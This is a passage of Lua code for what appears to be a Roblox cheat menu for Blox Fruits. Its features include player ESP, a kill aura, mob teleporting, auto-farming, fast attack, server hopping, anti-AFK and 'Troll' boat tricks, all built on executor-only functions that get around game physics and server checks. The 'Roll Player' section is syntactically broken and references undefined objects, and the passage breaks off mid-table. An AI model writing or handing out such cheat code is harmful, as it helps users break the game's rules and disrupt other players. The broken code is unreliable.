Tp3:Toggle("ESP Players",false,function(a)
    ESPPlayer = a
    UpdatePlayerChams()
    
end)
Tp3:Toggle("ESP Chests",false,function(a)
    ChestESP = a
    UpdateChestChams() 
end)
Tp3:Toggle("ESP Devil Fruit",false,function(a)
    DevilFruitESP = a
    UpdateDevilChams() 
end)
Tp3:Toggle("ESP Flowers",false,function(a)
    FlowerESP = a
    UpdateFlowerChams() 
end)

spawn(function()
    pcall(function()
        while wait() do
            if ESPPlayer then
                UpdatePlayerChams()
            end
        end
    end)
end)
spawn(function()
    pcall(function()
        while wait() do
            if ChestESP then
                UpdateChestChams()
            end
        end
    end)
end)
spawn(function()
    pcall(function()
        while wait() do
            if DevilFruitESP then
                UpdateDevilChams()
            end
        end
    end)
end)
spawn(function()
    pcall(function()
        while wait() do
            if FlowerESP then
                UpdateFlowerChams()
            end
        end
    end)
end)

local Raid1 = Tab4:Section("- Main Dungeon -","Right")
Dungeon = {
    "Flame",
    "Ice",
    "Quake",
    "Light",
    "Dark",
    "Spider",
    "Rumble",
    "Magma",
    "Human: Buddha",
    "Sand",
    "Bird: Phoenix",
    "Dough"
}
Raid1:Dropdown("Select Dungeon",Dungeon,{"Select Weapon"},function(v)
    _G.Select_Dungeon = v
end)

Raid1:Toggle("Auto Buy Chip Dungeon",false,function(a)
    _G.Auto_Buy_Chips_Dungeon = a
end)
spawn(function()
    while wait() do
        if _G.Auto_Buy_Chips_Dungeon then
            pcall(function()
                local args = {
                    [1] = "RaidsNpc",
                    [2] = "Select",
                    [3] = _G.Select_Dungeon
                }
                
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end)
        end
    end
end)
Raid1:Toggle("Auto Start Dungeon",false,function(a)
    _G.Auto_Start_Dungeon = a
end)
spawn(function()
    while wait() do
        if _G.Auto_Start_Dungeon then
            pcall(function()
                if game.PlaceId == 4442272183 then
                    if not game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Island 1") then
                        if game.Players.LocalPlayer.Backpack:FindFirstChild("Special Microchip") then 
                            fireclickdetector((game:GetService("Workspace")).Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector);
                        end
                    end
                elseif game.PlaceId == 7449423635 then
                    if not game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Island 1") then
                        if game.Players.LocalPlayer.Backpack:FindFirstChild("Special Microchip") then
                            fireclickdetector((game:GetService("Workspace")).Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector);
                        end
                    end
                end
            end)
        end
    end
end)
Raid1:Toggle("Auto Finish Dungeon",false,function(a)
    _G.Auto_Next_Island = a
end)
Raid1:Toggle("Kill Aura",false,function(a)
    _G.Kill_Aura = a
end)
spawn(function()
    while wait() do
        if _G.Auto_Next_Island then
            if (not game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible == false) then
				if (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 5") then
					getgenv().ToPos(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 5")).CFrame * CFrame.new(0, 70, 100));
				elseif (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 4") then
					getgenv().ToPos(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 4")).CFrame * CFrame.new(0, 70, 100));
				elseif (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 3") then
					getgenv().ToPos(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 3")).CFrame * CFrame.new(0, 70, 100));
				elseif (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 2") then
					getgenv().ToPos(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 2")).CFrame * CFrame.new(0, 70, 100));
				elseif (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 1") then
					getgenv().ToPos(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 1")).CFrame * CFrame.new(0, 70, 100));
				end
			end
        end
    end
end)
spawn(function()
    while wait() do
        if _G.Auto_Next_Island or _G.Kill_Aura then
            for i,v in pairs(game.Workspace.Enemies:GetDescendants()) do
                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                    pcall(function()
                        repeat wait(.1)
                            v.Humanoid.Health = 0
                            v.HumanoidRootPart.CanCollide = false
                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                        until not _G.Auto_Next_Island or not _G.Kill_Aura or not v.Parent or v.Humanoid.Health <= 0
                    end)
                end
            end
        end
    end
end)
Raid1:Toggle("Auto Awake",false,function(a)
    _G.Auto_Awake = a
end)
spawn(function()
    while wait(.1) do
        if _G.Auto_Awake then
            pcall(function()
                local args = {
                    [1] = "Awakener",
                    [2] = "Check"
                }
                
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                local args = {
                    [1] = "Awakener",
                    [2] = "Awaken"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end)
        end
    end
end)

local Join = Tab2:Section("- Team -","Right")
local Join2 = Tab6:Section("- Server -","left")
local Join3 = Tab6:Section("- GUI -","left")
local Join5 = Tab6:Section("- Setting -","Right")
local Troll = Tab6:Section("- Troll -","Right")

Join:Button("Join Pirates Team",function()
    local args = {
        [1] = "SetTeam",
        [2] = "Pirates"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args)) 
    local args = {
        [1] = "BartiloQuestProgress"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end)
Join:Button("Join Marines Team",function()
    local args = {
        [1] = "SetTeam",
        [2] = "Marines"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    local args = {
        [1] = "BartiloQuestProgress"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end)

Join2:Textbox("JobId Teleport","JobId Here",function(value)
    getgenv().ipTPss = value
end)
Join2:Button("Teleport Server by JobId",function()
    local JobTarget = getgenv().ipTPss
    game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport',JobTarget,game.Players.LocalPlayer)
end) 
Join2:Button("Rejoin Server",function()
    local ts = game:GetService("TeleportService")
    local p = game:GetService("Players").LocalPlayer
    ts:Teleport(game.PlaceId, p)
end)
Join2:Button("Server Hop",function()
    Hop()
end)
Join3:Button("Inventory Fruit",function()
    local args = {
        [1] = "getInventoryFruits"
    }
    
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventoryFruits")
    game:GetService("Players").LocalPlayer.PlayerGui.Main.FruitInventory.Visible = true
end)
Join3:Button("Shop Devil Fruit",function()
    local args = {
        [1] = "GetFruits"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    game.Players.localPlayer.PlayerGui.Main.FruitShop.Visible = true
end)
Join3:Button("Color Haki",function()
    game.Players.localPlayer.PlayerGui.Main.Colors.Visible = true
end)
Join3:Button("Title Name",function()
    local args = {
        [1] = "getTitles"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    game.Players.localPlayer.PlayerGui.Main.Titles.Visible = true
end)
Join5:Toggle("Anit Afk",true,function(v)
    _G.Anit_Afk = v
end)
Join5:Toggle("SafeZone Show",false,function(v)
    _G.SafeZoneView = v
end)
spawn(function()
    pcall(function()
        while wait() do
            if _G.SafeZoneView then
                for i,v in pairs(game:GetService("Workspace")["_WorldOrigin"].SafeZones:GetChildren()) do
                    if v.Name == "Safezone" then
                        v.Transparency = 0.7
                        v.Color = Color3.fromRGB(0,255,0)
                    end
                end
            else
                for i,v in pairs(game:GetService("Workspace")["_WorldOrigin"].SafeZones:GetChildren()) do
                    if v.Name == "Safezone" then
                        v.Transparency = 1
                        v.Color = Color3.fromRGB(255,255,0)
                    end
                end
            end
        end
    end)
end)
function checkboat()
    for r, v in next, game:GetService("Workspace").Boats:GetChildren() do
        if v:IsA("Model") then
            if
                v:FindFirstChild("Owner") and tostring(v.Owner.Value) == game:GetService("Players").LocalPlayer.Name and
                v.Humanoid.Value > 0
            then
                return v
            end
        end
    end
    return false
end
Troll:Toggle("Bring Boat",false,function(value)
    _G.bring = value
end)
Troll:Button("Bring Boat That Position",function()
    _G.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
end)
spawn(function()
    pcall(function()
        while wait() do
            if _G.bring then
                if checkboat() then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = _G.Position
                    game.Players.LocalPlayer.Character.Humanoid.Jump = true
                    checkboat().VehicleSeat.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                else
                    print("ccccc")
                end
            end
        end
    end)
end)
_G.speed = 300
Troll:Button("Mod Boat",function()
    checkboat()
    if checkboat() then
        if checkboat().VehicleSeat:FindFirstChild("BodyGyro") then
            checkboat().VehicleSeat.BodyGyro:Destroy()
        end
        if checkboat().VehicleSeat:FindFirstChild("BodyPosition") then
            checkboat().VehicleSeat.BodyPosition:Destroy()
        end
        if checkboat().VehicleSeat:FindFirstChild("BodyVelocity") then
            checkboat().VehicleSeat.BodyVelocity:Destroy()
        end
    end
end)
Troll:Button("Spin Boat",function()
    local player = game.Players.LocalPlayer
    local bankinh = 75
    local tocdo = 480
    local offsetc = CFrame.new(0, 10, 0)
    if checkboat() then
        local uwu = checkboat():FindFirstChild("VehicleSeat")
        spawn(function()
            uwu:FindFirstChild("BodyVelocity"):Destroy()
            uwu:FindFirstChild("BodyGyro"):Destroy()
            uwu:FindFirstChild("BodyPosition"):Destroy()
        end)
        local primaryPart = checkboat().PrimaryPart
        game:GetService("RunService").Heartbeat:Connect(function()
            local plrpos = player.Character.PrimaryPart.Position
            local angle = math.rad((tick() * tocdo) % 360)
            local offsetX = bankinh * math.cos(angle)
            local offsetZ = bankinh * math.sin(angle)
            local targetPos = Vector3.new(plrpos.X + offsetX, plrpos.Y, plrpos.Z + offsetZ)
            primaryPart.CFrame = CFrame.new(targetPos) * offsetc
            local lookVector = (plrpos - primaryPart.Position).Unit
            primaryPart.CFrame = CFrame.new(primaryPart.Position, primaryPart.Position + Vector3.new(lookVector.X, 0, lookVector.Z))
        end)
    end
end)
game.Players.LocalPlayer.Character.PrimaryPart.Anchored = false
local antimover1 = game.Players.LocalPlayer.Character.PrimaryPart:GetPropertyChangedSignal("Anchored"):Connect(function()
    if game.Players.LocalPlayer.Character.PrimaryPart.Anchored == true then
        game.Players.LocalPlayer.Character.PrimaryPart.Anchored = false
    end
end)
local antimover2 = game.Players.LocalPlayer.Character.PrimaryPart.ChildAdded:Connect(function(child)
    repeat wait() until child.Locked == false
    if child:IsA("BodyPosition") or child:IsA("BodyVelocity") then
        local check = false
        for i,v in pairs(whitelist) do
            if child.Name == v then
                check = true
            end
        end
        if check == false then
            child:Destroy()
        end
    end
end)
spawn(function()
    pcall(function()
        while wait() do
            if checkboat() then
                checkboat().VehicleSeat.MaxSpeed = _G.speed
                end
        end
    end)
end)
spawn(function()
    pcall(function()
        while wait() do
            checkboat()
        end
    end)
end)
Troll:Toggle("Auto Decrease Money",false,function(v)
    _G.DecreaseMoney = v
end)
Troll:Button("Roll Player",function()
    _G.FlysESF = true
    local plr = game.Players.LocalPlayer
    repeat wait() until plr and plr.Character and plr.Character:findFirstChild("HumanoidRootPart") and plr.Character:findFirstChild("Humanoid") 
    local mouse = game.Players.LocalPlayer:GetMouse()  
    repeat wait() until mouse

    local torso = plr.Character.HumanoidRootPart 
    local flying = false
    local deb = true 
    local ctrl = {f = 0, b = 0, l = 0, r = 0} 
    local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
    local maxspeed = 1000 
    local speed = 50
    function Fly() 
    local bg = Instance.new("BodyGyro", torso) 
    bg.P = 9e4 
    bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
    bg.cframe = torso.CFrame 
    local bv = Instance.new("BodyVelocity", torso) 
    bv.velocity = Vector3.new(0,0.1,0) 
    bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
    repeat wait() 
    plr.Character.Humanoid.PlatformStand = true 
    if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
    speed = speed+.5+(speed/maxspeed) 
    if speed > maxspeed then 
    speed = maxspeed 
    end 
    elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
    speed = speed-1 
    if speed < 0 then 
                    speed = 0
                else
                    speed = 50
    end 
    end 
    if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
    bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
    lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
    elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
    bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
    else 
    bv.velocity = Vector3.new(0,0.1,0) 
    end 
    bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
    until not flying 
    ctrl = {f = 0, b = 0, l = 0, r = 0} 
    lastctrl = {f = 0, b = 0, l = 0, r = 0} 
        
    bg:Destroy() 
    bv:Destroy() 
        plr.Character.Humanoid.PlatformStand = false 
        speed = 50
    end 

    if _G.FlysESF then 
            if flying then flying = false 
                speed = 50
    else 
    flying = true 
    Fly()

    end 
    elseif key:lower() == "w" then 
    ctrl.f = 1 
    elseif key:lower() == "s" then 
    ctrl.b = -1 
    elseif key:lower() == "a" then 
    ctrl.l = -1 
    elseif key:lower() == "d" then 
    ctrl.r = 1 
    end 
    mouse.KeyUp:connect(function(key) 
    if key:lower() == "w" then 
    ctrl.f = 0 
    elseif key:lower() == "s" then 
    ctrl.b = 0 
    elseif key:lower() == "a" then 
    ctrl.l = 0 
    elseif key:lower() == "d" then 
    ctrl.r = 0 
    end 
    end)

    plr.Character.Humanoid.StateChanged:Connect(function(o,n)
        if n == Enum.HumanoidStateType.Running then
            ctrl.f = 1
        else
            ctrl.f = 0
        end
    end)
    script.Parent.TextButton.MouseButton1Click:Connect(function()
        if flying then
            flying = false
            speed = 50
        else
            flying = true
            Fly()
        end
    end)

    local script = Instance.new('LocalScript', Frame)
    local Trigger = script.Parent.MiniTrext
    local IsMini = false
    function CreateTween(Instance,Style,Direction,Time,table,RepeatCount,CanRepeat,Delay)
        local ts = game:GetService("TweenService")
        local TweenInfo = TweenInfo.new(Time,Style,Direction,RepeatCount,CanRepeat,Delay)
        local Tween = ts:Create(Instance,TweenInfo,table)
        repeat wait() until Tween ~= nil
        return Tween
    end
    Trigger.MouseButton1Click:Connect(function()
        if IsMini then
            CreateTween(script.Parent,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0.5,{Size = UDim2.new(0.265, 0,0.1, 0)},0,false,0.1):Play()
            IsMini = false
            Trigger.Text = "-"
        else
            CreateTween(script.Parent,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0.5,{Size = UDim2.new(0.265, 0,0.042, 0)},0,false,0.1):Play()
            IsMini = true
            Trigger.Text = "+"
        end
    end)
    script.Parent.Delete.MouseButton1Click:Connect(function()
        script.Parent.Parent:Destroy()
    end)
end)
spawn(function()
    pcall(function()
        if _G.Anit_Afk then
            local vu = game:GetService("VirtualUser")
            game:GetService("Players").LocalPlayer.Idled:connect(function()
                vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
                wait(1)
                vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
            end)
        end
    end)
end)


    getgenv().BringMobs = function(F, z)
        coroutine.wrap(function()
            pcall(function()
                for U, d in pairs(game.Workspace.Enemies:GetChildren()) do
                    if d:FindFirstChild("Humanoid") and d:FindFirstChild("HumanoidRootPart") and (d.Name == z) then
                        if isnetworkowner ~= nil and isnetworkowner(d:FindFirstChild("HumanoidRootPart")) then
                            d:FindFirstChild("HumanoidRootPart").Transparency = 1
                            d:FindFirstChild("Humanoid"):ChangeState(11)
                            d:FindFirstChild("HumanoidRootPart").Size = Vector3.new(60,60,60)
                            d:FindFirstChild("Humanoid").WalkSpeed = 0
                            d:FindFirstChild("Humanoid").JumpPower = 0
                            if not d:FindFirstChild("HumanoidRootPart"):FindFirstChild("BV") then
                                local m = Instance.new("BodyVelocity")
                                m.Parent = d:FindFirstChild("HumanoidRootPart")
                                m.Name = "BV"
                                m.MaxForce = Vector3.new(100000, 100000, 100000)
                                m.Velocity = Vector3.new(0, 0, 0)
                            end
                            if d:FindFirstChild("Humanoid"):FindFirstChild("Animator") then
                                d:FindFirstChild("Humanoid"):FindFirstChild("Animator"):Remove()
                            end
                            d:FindFirstChild("HumanoidRootPart").CFrame = F
                            sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                        elseif (F.Position - d.HumanoidRootPart.Position).magnitude < 300 then
                            d:FindFirstChild("HumanoidRootPart").Transparency = 1
                            d:FindFirstChild("Humanoid"):ChangeState(11)
                            d:FindFirstChild("HumanoidRootPart").Size = Vector3.new(60,60,60)
                            d:FindFirstChild("Humanoid").WalkSpeed = 0
                            d:FindFirstChild("Humanoid").JumpPower = 0
                            if not d:FindFirstChild("HumanoidRootPart"):FindFirstChild("BV") then
                                local u = Instance.new("BodyVelocity")
                                u.Parent = d:FindFirstChild("HumanoidRootPart")
                                u.Name = "BV"
                                u.MaxForce = Vector3.new(100000, 100000, 100000)
                                u.Velocity = Vector3.new(0, 0, 0)
                            end
                            if d:FindFirstChild("Humanoid"):FindFirstChild("Animator") then
                                d:FindFirstChild("Humanoid"):FindFirstChild("Animator"):Remove()
                            end
                            d:FindFirstChild("HumanoidRootPart").CFrame = F
                            sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                        end
                    end
                end
            end)
        end)()
    end

function TP(gotoCFrame)
    pcall(function()
        game.Players.LocalPlayer.Character.Humanoid.Sit = false
    end)
    if (game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.Position - gotoCFrame.Position).Magnitude <= 200 then
        pcall(function() 
            tween:Cancel()
        end)
        game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.CFrame = gotoCFrame
    else
        local tween_s = game:service"TweenService"
        local info = TweenInfo.new((game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.Position - gotoCFrame.Position).Magnitude/300, Enum.EasingStyle.Linear)
        local tween, err = pcall(function()
            tween = tween_s:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], info, {CFrame = gotoCFrame})
            tween:Play()
        end)
        if not tween then return err end
    end
end
spawn(function()
    while task.wait() do
        pcall(function()
            for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                if v:FindFirstChild("Humanoid") then
                    if v.Humanoid.Health <= 0 then
                        v.Parent = game.Workspace
                    end
                end
            end
        end)
    end
end)
spawn(function()
    while task.wait() do
        pcall(function()
            setfflag("HumanoidParallelRemoveNoPhysics", "False")
            setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
        end)
    end
end)
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
wait(1)
vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

Wapon = {
    "Melee",
    "Sword",
    "Gun",
    "Blox Fruit"
}

local SelectWeapona = Section2:Dropdown("Select Weapon/Combat",Wapon,{"Select Weapon"},function(value)
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if v:IsA("Tool") then
            if v.ToolTip == value then
                _G.ConfigTestDropdownNormal = v.Name
            end
        end
    end
end)

spawn(function()
    while wait() do
        if _G.AutoFarmL or _G.AutoFarmBone or _G.Auto_Rengoku or _G.Auto_Farm_Boss or _G.Auto_Farm_Bone or _G.Auto_Elite_Hunter or _G.Auto_Cake_Prince or _G.ToolEPPA or _G.Fast_Farm then
            pcall(function()
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild(_G.ConfigTestDropdownNormal))
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if _G.AutoFarmL or _G.AutoFarmBone or _G.Auto_Rengoku or _G.Auto_Farm_Boss or _G.Auto_Farm_Bone or _G.Auto_Elite_Hunter or _G.Auto_Cake_Prince or _G.ToolEPPA or _G.Fast_Farm then
            pcall(function()
                function BringMob(BringName)
                    if game.Workspace:FindFirstChild(BringName) then
                        for i, v in pairs(game.Workspace:GetChildren()) do
                            if v and v.Parent and v.Name == BringName and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid").Health > 0 and (v.HumanoidRootPart.Position - PosMon).Magnitude < 350 then
                                PosMon = v.HumanoidRootPart.Position
                            end
                        end
                        for i, v in pairs(game.Workspace:GetChildren()) do
                            if v and v.Parent and v.Name == BringName and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid").Health > 0 and (v.HumanoidRootPart.Position - PosMon).Magnitude < 350 then
                                v.HumanoidRootPart.Position = PosMon
                                v.Humanoid:ChangeState(14)
                                v.Humanoid:ChangeState(11)
                                v.HumanoidRootPart.CanCollide = false
                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1)
                                for al, f in pairs(v:GetChildren()) do
                                    if v:IsA("BasePart") then
                                        v.Velocity = Vector3.new(0, 0, 0)
                                        v.CanCollide = 0
                                        v.Anchored = true
                                    end
                                end
                                if v:FindFirstChild("Humanoid") then
                                    v.Humanoid.WalkSpeed = 0
                                    v.Humanoid.JumpPower = 0
                                else
                                    return
                                end
                                if v.Humanoid:FindFirstChild("Animator") then
                                    v.Humanoid.Animator:Destroy()
                                end
                                sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                            end
                        end
                    end
                end
                function NameMobNear()
                    local Mob
                    local MobTable = {}
                    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                        if not table.find(MobTable, v) and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                            table.insert(MobTable, v)
                        end
                    end
                    local Min = math.huge
                    for i, v in pairs(MobTable) do
                        local Dis = game.Players.LocalPlayer:DistanceFromCharacter(v.HumanoidRootPart.Position)
                        if Min > Dis and Mob ~= v.Name then
                            Min = Dis
                            Mob = v.Name
                        end
                    end
                    return Mob
                end
                BringMob(NameMobNear())
            end)
        end
    end
end)

_G.FastAttackSliderSet = 0.5
local FSDayter = {
    "Super Fast [ 0.05s ]",
    "Fast [ 0.1s ]",
    "Default [ 0.5s ]",
    "Medium [ 0.8s ]",
    "Slow [ 1.0s ]"
}
Section2:Dropdown("Fast Attack Delay",FSDayter,{"Default [ 0.5 ]"},function(v)
    _G.A_ZXFFastAttack3 = v
end)
Section2:Toggle("Fast Attack",true,function(a)
    _G.A_SzFastAttack = a
end)
--_G.FastAttackSpeed2 = a
spawn(function()
    while wait(.1) do
        pcall(function()
            if _G.A_ZXFFastAttack3 == "Super Fast [ 0.05s ]" then
                _G.FastAttackSliderSet = 0.05
            elseif _G.A_ZXFFastAttack3 == "Fast [ 0.1s ]" then
                _G.FastAttackSliderSet = 0.1
            elseif _G.A_ZXFFastAttack3 == "Default [ 0.5s ]" then
                _G.FastAttackSliderSet = 0.5
            elseif _G.A_ZXFFastAttack3 == "Medium [ 0.8s ]" then
                _G.FastAttackSliderSet = 0.8
            elseif _G.A_ZXFFastAttack3 == "Slow [ 1.0s ]" then
                _G.FastAttackSliderSet = 1
            else
                _G.FastAttackSliderSet = 0.5
            end
        end)
    end
end)
_G.FastAttackSliderSet = 0.5
Section2:Toggle("White Screen",false,function(v)
    _G.WhiteScreen = v
    if _G.WhiteScreen then
        game:GetService("RunService"):Set3dRenderingEnabled(false)
    else
        game:GetService("RunService"):Set3dRenderingEnabled(true)
    end
end)
Section2:Toggle("Auto Set Spawn",false,function(a)
    _G.SetSpawn = a
end)
Section2:Toggle("Auto Haki",true,function(a)
    _G.Haki = a
    _G.Auto_Buso = a
end)
Section2:Label("- Up Stats -")
Section2:Toggle("Melee",false,function(v)
    _G.Melee = v    
end)
Section2:Toggle("Defense",false,function(v)
    _G.Defense = v 
end)
Section2:Toggle("Sword",false,function(v)
    _G.Sword = v 
end)
Section2:Toggle("Gun",false,function(v)
    _G.Gun = v 
end)
Section2:Toggle("Fruit",false,function(v)
    _G.Fruit = v 
end)
Section2:Button("FPS Boost",function()
    local decalsyeeted = true
    local g = game
    local w = g.Workspace
    local l = g.Lighting
    local t = w.Terrain
    sethiddenproperty(l,"Technology",2)
    sethiddenproperty(t,"Decoration",false)
    t.WaterWaveSize = 0
    t.WaterWaveSpeed = 0
    t.WaterReflectance = 0
    t.WaterTransparency = 0
    l.GlobalShadows = 0
    l.FogEnd = 99
    l.Brightness = 0
    settings().Rendering.QualityLevel = "Level01"
    for i, v in pairs(w:GetDescendants()) do
        if v:IsA("BasePart") and not v:IsA("MeshPart") then
            v.Material = "Plastic"
            v.Reflectance = 0
        elseif (v:IsA("Decal") or v:IsA("Texture")) and decalsyeeted then
            v.Transparency = 1
        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
            v.Lifetime = NumberRange.new(0)
        elseif v:IsA("Explosion") then
            v.BlastPressure = 1
            v.BlastRadius = 1
        elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
            v.Enabled = false
        elseif v:IsA("MeshPart") and decalsyeeted then
            v.Material = "Plastic"
            v.Reflectance = 0
            v.TextureID = 10385902758728957
        elseif v:IsA("SpecialMesh") and decalsyeeted  then
            v.TextureId=0
        elseif v:IsA("ShirtGraphic") and decalsyeeted then
            v.Graphic=0
        elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
            v[v.ClassName.."Template"]=0
        end
    end
    for i = 1,#l:GetChildren() do
        e=l:GetChildren()[i]
        if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
            e.Enabled = false
        end
    end
    w.DescendantAdded:Connect(function(v)
        wait()
        if v:IsA("BasePart") and not v:IsA("MeshPart") then
            v.Material = "Plastic"
            v.Reflectance = 0
        elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
            v.Transparency = 1
        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
            v.Lifetime = NumberRange.new(0)
        elseif v:IsA("Explosion") then
            v.BlastPressure = 1
            v.BlastRadius = 1
        elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
            v.Enabled = false
        elseif v:IsA("MeshPart") and decalsyeeted then
            v.Material = "Plastic"
            v.Reflectance = 0
            v.TextureID = 10385902758728957
        elseif v:IsA("SpecialMesh") and decalsyeeted then
            v.TextureId=0
        elseif v:IsA("ShirtGraphic") and decalsyeeted then
            v.ShirtGraphic=0
        elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
            v[v.ClassName.."Template"]=0
        end
    end)
end)
Section2:Button("Redeem All Code EXP X2",function()
    function UseCode(Text)
        game:GetService("ReplicatedStorage").Remotes.Redeem:InvokeServer(Text)
    end
    UseCode("UPD16")
    UseCode("2BILLION")
    UseCode("UPD15")
    UseCode("FUDD10")
    UseCode("BIGNEWS")
    UseCode("THEGREATACE")
    UseCode("SUB2GAMERROBOT_EXP1")
    UseCode("StrawHatMaine")
    UseCode("Sub2OfficialNoobie")
    UseCode("SUB2NOOBMASTER123")
    UseCode("Sub2Daigrock")
    UseCode("Axiore")
    UseCode("TantaiGaming")
    UseCode("STRAWHATMAINE")
    UseCode("GAMERROBOT_YT")
    UseCode("EXP_5B")
    UseCode("RESET_5B")
    UseCode("KittGaming")
    UseCode("Enyu_is_Pro")
    UseCode("Sub2Fer999")
    UseCode("Bluxxy")
    UseCode("JCWK")
    UseCode("Magicbus")
    UseCode("fudd10_v2 ")
    UseCode("Starcodeheo")
    UseCode("3BVISITS")
    UseCode("1MLIKES_RESET")
    UseCode("2BILLION")
end)
Section2:Toggle("Skill Z",true,function(a)
    _G.SkillZ = a
end)
Section2:Toggle("Skill X",false,function(a)
    _G.SkillX = a
end)
Section2:Toggle("Skill C",false,function(a)
    _G.SkillC = a
end)
Section2:Toggle("Skill V",false,function(a)
    _G.SkillV = a
end)
if game.PlaceId == 2753915549 then
    local BossTable = {"Saber Expert","The Saw","The Gorilla King","Greybeard","Bobby","Yeti","Mob Leader","Vice Admiral","Cyborg","Thunder God","Wysper","Fishman Lord","Magma Admiral","Swan","Chief Warden","Warden"}
    local boss = Section3:Dropdown("Select Boss",BossTable,{"Select Weapon"},function(v)
        _G.Select_Boss = v
    end)
elseif game.PlaceId == 4442272183 then
    local BossTable = {"Diamond","Jeremy","Fajita","Don Swan","Smoke Admiral","Cursed Captain","Darkbeard","Order","Awakened Ice Admiral","Tide Keeper"}
